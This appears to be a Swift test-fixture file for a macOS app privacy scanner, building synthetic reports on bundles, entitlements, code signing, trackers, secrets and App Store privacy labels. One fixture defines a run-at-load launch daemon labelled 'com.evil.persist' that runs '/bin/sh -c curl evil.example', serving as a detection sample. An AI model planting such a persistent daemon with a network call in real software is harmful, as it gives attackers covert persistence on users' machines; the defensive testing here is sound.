import Foundation
#if SWIFT_PACKAGE
@testable import privacycommandCore
#else
@testable import privacycommand
#endif

/// Shared builders for synthesised `StaticReport`s. The scorer/analyzers are
/// pure functions over their inputs, so none of this needs a real bundle on
/// disk — every field is supplied directly.
enum Fix {

    static func bundle(bundleID: String = "test.fixture") -> AppBundle {
        AppBundle(
            url: URL(fileURLWithPath: "/private/tmp/__fixture__.app"),
            bundleID: bundleID,
            bundleName: "Fixture",
            bundleVersion: "1.0",
            executableURL: URL(fileURLWithPath: "/private/tmp/__fixture__.app/Contents/MacOS/Fixture"),
            architectures: ["arm64"],
            minimumSystemVersion: "13.0"
        )
    }

    static func entitlements(sandboxed: Bool = false,
                             appGroups: [String] = [],
                             allowsJIT: Bool = false) -> Entitlements {
        Entitlements(
            raw: [:], isSandboxed: sandboxed, appGroups: appGroups, appleEvents: nil,
            networkClient: false, networkServer: false, allowsJIT: allowsJIT,
            allowsDyldEnvironmentVariables: false, disablesLibraryValidation: false,
            endpointSecurityClient: false, networkExtension: []
        )
    }

    static func signing(teamID: String? = "ABCDE12345",
                        platform: Bool = false,
                        validates: Bool = true,
                        hardened: Bool = true) -> CodeSigningInfo {
        CodeSigningInfo(
            teamIdentifier: teamID, signingIdentifier: "test.fixture",
            designatedRequirement: nil, hardenedRuntime: hardened, isAdhocSigned: false,
            isPlatformBinary: platform, validates: validates, validationError: nil
        )
    }

    static func report(
        bundle: AppBundle? = nil,
        entitlements: Entitlements? = nil,
        codeSigning: CodeSigningInfo? = nil,
        notarization: NotarizationStatus = .notarized,
        inferredCapabilities: [InferredCapability] = [],
        provenance: ProvenanceInfo = .empty,
        updateMechanism: UpdateMechanism? = nil,
        frameworks: [FrameworkRef] = [],
        hardcodedURLs: [String] = [],
        hardcodedDomains: [String] = [],
        sdkHits: [SDKHit] = [],
        secrets: [SecretFinding] = [],
        embeddedAssets: EmbeddedAssets = .empty,
        privacyManifest: PrivacyManifest? = nil,
        flagFindings: [FlagFinding] = [],
        appStoreInfo: AppStoreInfo = .notMAS
    ) -> StaticReport {
        StaticReport(
            bundle: bundle ?? Fix.bundle(),
            declaredPrivacyKeys: [],
            entitlements: entitlements ?? Fix.entitlements(),
            codeSigning: codeSigning ?? Fix.signing(),
            notarization: notarization,
            urlSchemes: [], documentTypes: [], loginItems: [], xpcServices: [],
            helpers: [], frameworks: frameworks, inferredCapabilities: inferredCapabilities,
            hardcodedURLs: hardcodedURLs, hardcodedDomains: hardcodedDomains, hardcodedPaths: [], warnings: [],
            provenance: provenance,
            updateMechanism: updateMechanism,
            sdkHits: sdkHits,
            secrets: secrets,
            embeddedAssets: embeddedAssets,
            privacyManifest: privacyManifest,
            flagFindings: flagFindings,
            appStoreInfo: appStoreInfo
        )
    }

    static func tracker(_ name: String, category: SDKCategory = .analytics) -> SDKHit {
        SDKHit(
            fingerprint: SDKFingerprint(id: name.lowercased(), displayName: name,
                                        vendor: name, category: category, description: ""),
            evidence: [.framework("\(name).framework")]
        )
    }

    static func secret(_ kind: SecretFinding.Kind,
                       confidence: SecretFinding.Confidence = .high) -> SecretFinding {
        SecretFinding(kind: kind, vendor: "Test", masked: "XXXX…YYYY",
                      rawLength: 40, confidence: confidence, kbArticleID: nil)
    }

    static func runAtLoadDaemon(label: String = "com.evil.persist") -> EmbeddedAssets.LaunchPlist {
        EmbeddedAssets.LaunchPlist(
            url: URL(fileURLWithPath: "/tmp/\(label).plist"),
            label: label, program: "/bin/sh", programArguments: ["-c", "curl evil.example"],
            runAtLoad: true, keepAlive: false, machServices: [], kind: .daemon
        )
    }

    static func devFlag() -> FlagFinding {
        FlagFinding(kind: .debugFlag, rawMatch: "ENABLE_DEBUG_MENU",
                    category: .debugging, kbArticleID: nil)
    }

    static func undeclaredCapability(_ category: PrivacyCategory = .location) -> InferredCapability {
        InferredCapability(category: category, confidence: .high,
                           evidence: ["Links \(category.rawValue)"],
                           declaredButNotJustified: false, inferredButNotDeclared: true)
    }

    // MARK: - App Store labels

    static func notCollectedLabels() -> PrivacyLabels {
        PrivacyLabels(types: [
            .init(identifier: "DATA_NOT_COLLECTED", title: "Data Not Collected",
                  detail: "", categories: [])
        ])
    }

    static func labels(track: Bool) -> PrivacyLabels {
        var types: [PrivacyLabels.PrivacyType] = [
            .init(identifier: "DATA_NOT_LINKED_TO_YOU", title: "Data Not Linked to You",
                  detail: "", categories: [.init(identifier: "USAGE_DATA", title: "Usage Data")])
        ]
        if track {
            types.append(.init(identifier: "DATA_USED_TO_TRACK_YOU",
                               title: "Data Used to Track You", detail: "",
                               categories: [.init(identifier: "IDENTIFIERS", title: "Identifiers")]))
        }
        return PrivacyLabels(types: types)
    }

    static func masWith(labels: PrivacyLabels?) -> AppStoreInfo {
        AppStoreInfo(isMASApp: true, bundleID: "test.fixture",
                     privacyLabels: labels, privacyDetailsStatus: .provided)
    }
}
